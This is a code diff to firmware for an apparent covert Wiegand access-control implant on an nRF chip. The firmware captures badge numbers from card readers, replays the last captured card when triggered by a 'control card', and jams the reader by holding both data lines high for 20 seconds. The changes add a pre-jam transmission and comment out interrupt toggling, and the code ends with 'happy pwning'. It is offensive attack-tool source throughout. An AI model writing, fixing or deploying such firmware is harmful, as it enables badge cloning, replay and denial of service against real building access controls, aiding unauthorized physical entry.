@@ -68,7 +68,10 @@ void dos_timer_handler(void * p_context)
 {
     nrf_gpio_pin_clear(DATA0_CTL);
     nrf_gpio_pin_clear(DATA1_CTL);
-    sd_nvic_EnableIRQ(GPIOTE_IRQn);
+
+    //sd_nvic_ClearPendingIRQ(GPIOTE_IRQn);
+    //sd_nvic_EnableIRQ(GPIOTE_IRQn);
+
     app_timer_stop(dos_timer_id);
     printf("timer off - DoS complete...\r\n");
 }
@@ -116,8 +119,8 @@ void wiegand_init(Wiegand_ctx *ctx)
 
     printf("Configuring app timer for DoS function...\r\n");
     err_code = app_timer_create(&dos_timer_id,
-                                APP_TIMER_MODE_REPEATED,
-                                dos_timer_handler);
+            APP_TIMER_MODE_REPEATED,
+            dos_timer_handler);
     check_err(err_code);
 
     printf("Done, happy pwning.\r\n");
@@ -143,15 +146,15 @@ void tx_wiegand(uint64_t data, uint8_t size)
     // this turns off application interrupts (not softdevice)
     sd_nvic_critical_region_enter(&foo);
     for (uint8_t i = size; i-- > 0;)
-        {
-            // wiegand pulses should be ~40us, there should be ~2.025ms
-            // between each pulse...correcting for fubar nrf delay here.
-            uint8_t bit = GETBIT(data, i);
-            bit ? nrf_gpio_pin_set(DATA1_CTL) : nrf_gpio_pin_set(DATA0_CTL);
-            nrf_delay_us(26);
-            bit ? nrf_gpio_pin_clear(DATA1_CTL) : nrf_gpio_pin_clear(DATA0_CTL);
-            nrf_delay_us(1380);
-        }
+    {
+        // wiegand pulses should be ~40us, there should be ~2.025ms
+        // between each pulse...correcting for fubar nrf delay here.
+        uint8_t bit = GETBIT(data, i);
+        bit ? nrf_gpio_pin_set(DATA1_CTL) : nrf_gpio_pin_set(DATA0_CTL);
+        nrf_delay_us(26);
+        bit ? nrf_gpio_pin_clear(DATA1_CTL) : nrf_gpio_pin_clear(DATA0_CTL);
+        nrf_delay_us(1380);
+    }
     sd_nvic_critical_region_exit(foo);
 }
 
@@ -222,8 +225,10 @@ void wiegand_task(void)
                 case CTL_CARD_1:
                     printf("Control card: deadbeef\r\n");
                     printf("Replay last card %llx\r\n", last_card);
+                    send_wiegand(255);
+                    nrf_delay_us(50000);
                     printf("DoS Wiegand for 20 seconds...\r\n");
-                    sd_nvic_DisableIRQ(GPIOTE_IRQn);
+                    //sd_nvic_DisableIRQ(GPIOTE_IRQn);
                     nrf_gpio_pin_set(DATA0_CTL);
                     nrf_gpio_pin_set(DATA1_CTL);
                     app_timer_start(dos_timer_id, APP_TIMER_TICKS(20000, 0), NULL);
@@ -248,15 +253,15 @@ void wiegand_task(void)
                     add_card(&proxmark_fmt, bit_count);
                     num_reads++;
             }
-        }
 
-        //reset vars for next read
-        data_incoming = false;
-        timer_started = false;
-        data_ready = false;
-        card_fubar = false;
-        bit_count = 0;
-        card_data = 0;
+            //reset vars for next read
+            data_incoming = false;
+            timer_started = false;
+            data_ready = false;
+            card_fubar = false;
+            bit_count = 0;
+            card_data = 0;
+        }
     }
 }
 
